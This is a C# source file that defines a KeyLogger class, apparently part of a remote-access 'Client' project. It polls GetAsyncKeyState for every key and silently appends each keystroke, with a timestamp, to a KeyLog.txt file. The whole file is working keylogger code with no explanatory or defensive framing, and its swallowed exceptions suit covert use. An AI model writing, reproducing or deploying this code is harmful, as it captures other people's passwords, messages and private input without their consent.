using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;

namespace Client
{
    public class KeyLogger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        public static void Read()
        {
            try
            {
                foreach (int i in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        Logging(Enum.GetName(typeof(Keys), i) + " ");
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }

        private static void Logging(String Logmessage)
        {
            try
            {
                StreamWriter writer = new StreamWriter("KeyLog.txt", true);
                writer.WriteLine(DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + " | " + Logmessage);
                writer.Close();
            }
            catch (Exception ef)
            {

            }
        }
    }
}